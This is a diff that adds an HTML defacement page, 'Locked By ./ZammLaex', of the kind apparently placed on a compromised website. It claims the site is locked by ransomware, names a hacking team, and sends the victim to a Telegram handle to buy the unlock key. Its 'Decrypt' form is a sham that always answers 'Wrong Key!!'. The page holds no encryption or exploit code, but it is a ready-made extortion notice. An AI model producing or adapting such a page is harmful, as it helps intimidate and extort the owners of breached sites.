@@ -1,0 +1,198 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="Author"       content="ZammLaex">
+		<meta name="keywords" content="ZammLaex M.Kom-" />
+        <meta name="copyright"    content="KBHT"/>
+		<meta name="description"  content="Hacked ZammLaex M.Kom-"/>
+    <title>Locked By ./ZammLaex</title>
+    <link rel="icon" href="https://i.ibb.co.com/f90YztM/monokuma-danganronpa.gif">
+    <link href="https://fonts.googleapis.com/css?family=Kelly+Slab|Orbitron&display=swap" rel="stylesheet">
+    <style>
+        @font-face {
+            font-family: 'Panton';
+            src: url('https://zexx13feb.github.io/font/Panton.ttf') format('opentype');
+        }
+        
+        @font-face {
+            font-family: 'Borned';
+            src: url('https://zexx13feb.github.io/font/Borned.ttf') format('opentype');
+        }
+
+        @font-face {
+            font-family: "riv";
+            src: url('https://bca-x666x-team.github.io/riv.ttf');
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            font-family: Arial, sans-serif;
+            background-color: black;
+            cursor: pointer;
+        }
+
+        .container {
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+
+        .container img {
+            width: 150px;
+            height: 100px;
+            border-radius: 8%;
+            margin-bottom: 15px;
+        }
+        
+        .container o {
+        		 font-size: 15px;
+            font-family: 'Orbitron', sans-serif;
+            color: red;
+            }
+        .container p {
+            font-size: 12px;
+            font-family: 'Orbitron', sans-serif;
+            
+        }
+
+        .container z {
+        		 padding: 5px;
+            font-size: 14px;
+            font-family: 'Orbitron', sans-serif;
+            text-decoration: none;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .container m {
+            color: Red;
+            justify-content: center;
+            align-items: center;
+        }
+        .cug {
+        		 font-family:Orbitron;}
+
+        .clock {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        .container y {
+            font-family: "Kelly Slab", sans-serif;
+            margin-top: 20px;
+            color: white;
+            font-size: 10px;
+        }
+        
+        .ah {
+            padding: 5px;
+            margin: 10px 0;
+            font-size: 12px;
+            font-family: 'Borned', sans-serif;
+            color: #ce00ff;
+        }
+      
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co.com/f90YztM/monokuma-danganronpa.gif" alt="ZammLaex">             
+       <br> <z>Ransomware By <m>ZammLaex</m></z>
+       
+        <br>
+        <p> Contact My Telegram To Get The Key @SIapayakLU</p>
+        <div class="ah">
+- ! SUMATRA UTARA CYBER TEAM ! -
+        </div>
+        
+        
+        <font color="white"> 
+        <form action="" method="post" style=" text-align: center;"> <label>Key : </label> <input type="text" name="key" class="input" placeholder="your unlock key"> 
+        <button onclick="myFunction()">Decrypt</button> 
+        <script>
+        function myFunction() 
+        { var txt; 
+        if (confirm("Wrong Key!!") == true) { txt = ""; } 
+        else { txt = ""; } document.getElementById("demo").innerHTML = txt; } </script>
+        
+        <br>
+        <y>[ - Tap The Background to play music - ]</y>
+        <br>
+        
+        <div class="clock" id="clock"></div>
+    </div>
+    <audio id="myAudio" src="https://a.top4top.io/m_3004wn0wf1.mp3"></audio>
+    <script>
+        function updateClock() {
+            var now = new Date();
+            var hours = now.getHours().toString().padStart(2, '0');
+            var minutes = now.getMinutes().toString().padStart(2, '0');
+            var seconds = now.getSeconds().toString().padStart(2, '0');
+            var timeString = hours + ':' + minutes + ':' + seconds;
+            document.getElementById('clock').textContent = timeString;
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        document.body.addEventListener('click', function() {
+            var audio = document.getElementById('myAudio');
+            audio.play();
+        });
+    </script>
+        <script type="text/javascript">
+var rev = "silent";
+function titlebar(val)
+{
+    var msg  = "Locked By ./ZammLaex";
+    var res = " ";
+    var speed = 70
+    var pos = val;
+
+    msg = ""+msg+"";
+    var le = msg.length;
+    if(rev == "silent"){
+        if(pos < le){
+        pos = pos+1;
+        scroll = msg.substr(0,pos);
+        document.title = scroll;
+        timer = window.setTimeout("titlebar("+pos+")",speed);
+        }
+        else{
+        rev = "silents";
+        timer = window.setTimeout("titlebar("+pos+")",speed);
+        }
+    }
+    else{
+        if(pos > 0){
+        pos = pos-1;
+        var ale = le-pos;
+        scrol = msg.substr(ale,le);
+        document.title = scrol;
+        timer = window.setTimeout("titlebar("+pos+")",speed);
+        }
+        else{
+        rev = "silent";
+        timer = window.setTimeout("titlebar("+pos+")",speed);
+        }   
+    }
+}
+
+titlebar(0);
+</script>
+</body>
+</html>
